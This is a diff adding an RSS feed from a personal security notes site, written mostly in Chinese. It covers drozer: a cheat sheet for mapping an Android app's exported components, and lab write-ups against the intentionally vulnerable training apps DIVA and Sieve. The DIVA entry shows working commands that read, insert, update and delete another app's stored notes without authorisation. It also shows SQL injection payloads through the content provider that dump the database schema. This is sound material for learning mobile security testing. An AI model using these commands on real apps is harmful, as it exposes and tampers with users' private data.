@@ -1,0 +1,694 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/tools/others/android-related/drozer/index.xml" rel="self" type="application/rss+xml"/><item><title>Drozer Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/drozer-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/drozer-cheat-sheet/</guid><description>&lt;h1 id="drozer-cheat-sheet">
+ Drozer Cheat Sheet
+ &lt;a class="anchor" href="#drozer-cheat-sheet">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="basic-console">
+ Basic Console
+ &lt;a class="anchor" href="#basic-console">#&lt;/a>
+&lt;/h2>
+&lt;p>基本上最常用的command就是&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run &amp;lt;drozer module&amp;gt; &amp;lt;optional object&amp;gt; # 啟動內建的module做到依稀操作
+dz&amp;gt; help &amp;lt;drozer module&amp;gt; # 查看該module的說明以及參數設定
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.package.list #列出所有已安裝的app package
+dz&amp;gt; run app.package.list -f &amp;lt;key word&amp;gt; #列出特定的app package 
+dz&amp;gt; run app.package.info -a &amp;lt;app package name&amp;gt; # 列出該app的基本訊息
+dz&amp;gt; run app.package.manifest &amp;lt;app package name e.g. jakhar.aseem.diva&amp;gt; # 查看AndroidManifest.xml的資訊
+dz&amp;gt; run app.package.attacksurface &amp;lt;app package name e.g. com.mwr.example.sieve&amp;gt; # 查看該app有什麼攻擊面
+Attack Surface:
+ 3 activities exported # 也許可以啟動一個activity並且bypass某種應該阻止我啟動他的權限
+ 0 broadcast receivers exported
+ 2 content providers exported # 也許可以fetch private data或是利用某些漏洞 e.g. sqli or path traversal
+ 2 services exported
+ is debuggable
+&lt;/code>&lt;/pre>&lt;p>接著根據得到的資訊看要用以下哪一種的攻擊模式&lt;/p></description></item><item><title>Test DIVA - activity exported</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/</guid><description>&lt;ul>
+&lt;li>DIVA - &lt;a href="https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz">Download&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h1 id="test-diva---activity-exported">
+ Test DIVA - activity exported
+ &lt;a class="anchor" href="#test-diva---activity-exported">#&lt;/a>
+&lt;/h1>
+&lt;p>參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>&lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>起手式 - 確認App資訊&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.list -f diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>jakhar.aseem.diva &lt;span style="color:#f92672">(&lt;/span>Diva&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.info -a jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Application Label: Diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Process Name: jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Version: 1.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Data Directory: /data/user/0/jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> APK Path: /data/app/~~ieYmYeSxvDRbS7R8da3n_g&lt;span style="color:#f92672">==&lt;/span>/jakhar.aseem.diva--xnWMS5i2UVEuuoE1JHskg&lt;span style="color:#f92672">==&lt;/span>/base.apk
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10282&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> GID: &lt;span style="color:#f92672">[&lt;/span>3003&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Shared Libraries: &lt;span style="color:#f92672">[&lt;/span>/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Shared User ID: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uses Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.WRITE_EXTERNAL_STORAGE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_EXTERNAL_STORAGE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.INTERNET
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.POST_NOTIFICATIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.ACCESS_MEDIA_LOCATION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_AUDIO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_VIDEO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_IMAGES
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Defines Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.attacksurface jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attack Surface:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">3&lt;/span> activities exported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span> broadcast receivers exported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">1&lt;/span> content providers exported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span> services exported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> is debuggable
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>package name: jakhar.aseem.diva
+attack surface: activities exported/content providers exported/is debuggable&lt;/p></description></item><item><title>Test DIVA - content provider exported - DB Based</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/</guid><description>&lt;h1 id="test-diva---content-provider-exported---db-based">
+ Test DIVA - content provider exported - DB Based
+ &lt;a class="anchor" href="#test-diva---content-provider-exported---db-based">#&lt;/a>
+&lt;/h1>
+&lt;p>這一題是第&lt;code>11. Access Control Issues - Part 3&lt;/code>，用意是要我們不需要PIN code就可以access儲存起來的notes&lt;/p>
+&lt;ol>
+&lt;li>起手式
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.info -a jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: jakhar.aseem.diva.provider.notesprovider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: jakhar.aseem.diva.NotesProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: False
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.finduris -a jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For sure accessible content URIs:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>從以上測試結果可以知道&lt;code>jakhar.aseem.diva.NotesProvider&lt;/code>的狀況，以及對應的URI為何&lt;/li>
+&lt;li>逆向
+從&lt;code>NotesProvider&lt;/code>這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request&lt;/li>
+&lt;li>query/insert/update/delete/sqli
+&lt;ul>
+&lt;li>query
+我們達到了一開始題目的要求，只需要直接query就好了
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Exercise
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Alternate days running
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Expense
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Spent too much on home theater
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">6&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Weekend
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note b333333333333r
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title holiday
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Either Goa or Amsterdam
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title home
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title office
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>insert
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id &lt;span style="color:#ae81ff">7&lt;/span> --string title pwn1 --string note pwnpwn1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">7&lt;/span> | pwn1 | pwnpwn1 |
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>update
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selectio
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n-args &lt;span style="color:#ae81ff">7&lt;/span> --string title pwn2 --string note pwnpwn2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">7&lt;/span> | pwn2 | pwnpwn2 |
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>delete
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-args &lt;span style="color:#ae81ff">7&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>sqli
+測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exception occured: unrecognized token: &lt;span style="color:#e6db74">&amp;#34;&amp;#39;) ORDER BY title&amp;#34;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>code &lt;span style="color:#ae81ff">1&lt;/span> SQLITE_ERROR&lt;span style="color:#f92672">)&lt;/span>: , &lt;span style="color:#66d9ef">while&lt;/span> compiling: SELECT * FROM notes WHERE &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;) ORDER BY title
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection &amp;#34;* FROM SQLITE_MASTER WHERE type=&amp;#39;&lt;/span>table&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;--&lt;span style="color:#e6db74">&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">Attempting to run shell module
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| type | name | tbl_name | rootpage | sql |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | notes | notes | 4 | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) |
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | sqlite_sequence | sqlite_sequence | 5 | CREATE TABLE sqlite_sequence(name,seq) |
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>也可以透過drozer自動找可能的點
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.injection -a jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Projection:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Selection:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.sqltables -a jakhar.aseem.diva
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqlite_sequence
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://jakhar.aseem.diva.provider.notesprovider/notes:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> notes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqlite_sequence
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>Test Sieve - activities exported</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/</guid><description>&lt;ul>
+&lt;li>Drozer Seive - &lt;a href="https://labs.withsecure.com/tools/drozer#3.1">官網&lt;/a>, &lt;a href="https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/sieve.apk">Download&lt;/a>
+&lt;blockquote>
+&lt;p>Sieve is a small password manager app created to showcase some of the common vulnerabilities found in Android applications.&lt;/p>&lt;/blockquote>
+&lt;/li>
+&lt;/ul>
+&lt;h1 id="test-sieve---activities-exported">
+ Test Sieve - activities exported
+ &lt;a class="anchor" href="#test-sieve---activities-exported">#&lt;/a>
+&lt;/h1>
+&lt;p>參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>，在測試之前要先點進去Sieve App中設定password和email之類的基本資訊，這樣之後測試才知道哪邊其實是漏洞&lt;/p>
+&lt;ol>
+&lt;li>起手式-確認基本資訊
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.package.list -f Sieve # 確認該App的package name
+Attempting to run shell module
+com.mwr.example.sieve (Sieve)
+
+dz&amp;gt; run app.package.info -a com.mwr.example.sieve # 確認該App的基本資訊
+Attempting to run shell module
+Package: com.mwr.example.sieve
+ Application Label: Sieve
+ Process Name: com.mwr.example.sieve
+ Version: 1.0
+ Data Directory: /data/user/0/com.mwr.example.sieve
+ APK Path: /data/app/~~_mRnxjv10ez6OXDQWBrRZw==/com.mwr.example.sieve-yL301IHv87w7debjGy21vA==/base.apk
+ UID: 10285
+ GID: [3003]
+ Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar]
+ Shared User ID: null
+ Uses Permissions:
+ - android.permission.READ_EXTERNAL_STORAGE
+ - android.permission.WRITE_EXTERNAL_STORAGE
+ - android.permission.INTERNET
+ - android.permission.POST_NOTIFICATIONS
+ - android.permission.ACCESS_MEDIA_LOCATION
+ - android.permission.READ_MEDIA_AUDIO
+ - android.permission.READ_MEDIA_VIDEO
